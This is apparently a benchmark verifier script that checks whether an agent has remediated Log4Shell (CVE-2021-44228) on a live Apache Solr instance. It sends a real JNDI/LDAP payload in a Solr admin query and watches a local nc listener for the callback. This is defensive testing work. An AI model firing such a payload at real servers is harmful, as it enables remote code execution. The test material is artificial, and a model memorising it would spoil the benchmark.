#!/bin/bash
# Scenario 01: Apache Solr 8.11.0 Log4Shell (CVE-2021-44228)
#
# BEHAVIOURAL verifier. It does not grep jar versions or config files - those
# say nothing about the JVM that is actually running (a defender who edits
# solr.in.sh or drops in patched jars but never restarts Solr is still exposed).
# Instead it fires the real exploit at the LIVE service: a JNDI/LDAP payload is
# planted in a logged Solr query parameter and we watch a local listener for the
# outbound LDAP callback that a vulnerable Log4j makes. Callback observed =>
# still exploitable => FAIL. No callback (and Solr healthy) => remediated => PASS.
#
# Truth table:
#   vulnerable jars, Solr running        -> callback  -> FAIL
#   jars patched + Solr restarted        -> none      -> PASS
#   jars patched but Solr NOT restarted  -> callback  -> FAIL (old JVM)
#   nothing done                         -> callback  -> FAIL
#
# Two-component protocol: every check runs and is recorded with its kind, so
# "no callback because Solr was killed" is reported as regression_pass=false
# rather than collapsing into a bare exit 1. See lib/verifylib.sh.

set -u

# The guard is load-bearing: under the harness scorer.py has already inlined the
# library and set this, so the agent-writable /tmp path is never read.
[ -n "${_SYSREPAIR_VERIFYLIB_LOADED:-}" ] || . "${SYSREPAIR_VERIFYLIB:-/tmp/verifylib.sh}"

PORT=14567
HITFILE="/tmp/.l4s_hit.$$"
NCPID=""

cleanup() {
    [ -n "$NCPID" ] && kill "$NCPID" 2>/dev/null
    rm -f "$HITFILE"
}
trap cleanup EXIT INT TERM

###############################################################################
# Regression: the image CMD boots Solr (see .preserve-cmd); a live daemon is
# ALWAYS expected. verify.sh must NEVER start it - a freshly started daemon
# would mask the "patched but never restarted" case, and a dead service is a
# real failure.
###############################################################################
if pgrep -f 'start.jar' >/dev/null 2>&1; then
    record_reg solr_jvm_running 1
else
    record_reg solr_jvm_running 0 "Solr JVM is not running - a dead service is a failure (verify.sh must not start it)"
fi

# Solr must actually answer before we can get our payload logged; a 'no
# callback' reading on a dead endpoint is not remediation. That is recorded as a
# REGRESSION failure, which is what separates "patched Log4j" from "patched
# Log4j and destroyed Solr" -- the PoC below still runs and reports its own
# verdict, so both components are always measured.
UP=0
for i in $(seq 1 20); do
    if curl -sf -o /dev/null -m 3 http://127.0.0.1:8983/solr/admin/info/system; then
        UP=1; break
    fi
    sleep 1
done
if [ "$UP" = "1" ]; then
    record_reg solr_admin_reachable 1
else
    record_reg solr_admin_reachable 0 "Solr admin endpoint not reachable on 8983"
fi

###############################################################################
# PoC: drive the Log4Shell exploit against the running service.
###############################################################################
rm -f "$HITFILE"
# Bind a local listener that records any bytes a Log4j JNDI lookup sends us.
timeout 15 nc -l "$PORT" > "$HITFILE" 2>/dev/null &
NCPID=$!
sleep 1

PAYLOAD='${jndi:ldap://127.0.0.1:'"$PORT"'/a}'
curl -s -o /dev/null -m 6 -G --data-urlencode "action=$PAYLOAD" \
    "http://127.0.0.1:8983/solr/admin/cores" 2>/dev/null

# Give the vulnerable JVM time to resolve the lookup and dial back.
sleep 5

if [ -s "$HITFILE" ]; then
    record_poc no_jndi_callback 0 "Solr made an outbound LDAP callback from a logged \${jndi:...} payload - Log4Shell (CVE-2021-44228) is still exploitable"
else
    record_poc no_jndi_callback 1
fi

###############################################################################
# Regression: Solr must still serve requests normally.
###############################################################################
CODE=$(curl -s -o /dev/null -w '%{http_code}' -m 5 \
    "http://127.0.0.1:8983/solr/admin/cores?action=STATUS" 2>/dev/null || echo 000)
if [ "$CODE" = "200" ]; then
    record_reg solr_cores_status_200 1
else
    record_reg solr_cores_status_200 0 "Solr admin/cores returned HTTP $CODE (expected 200)"
fi

verify_finish
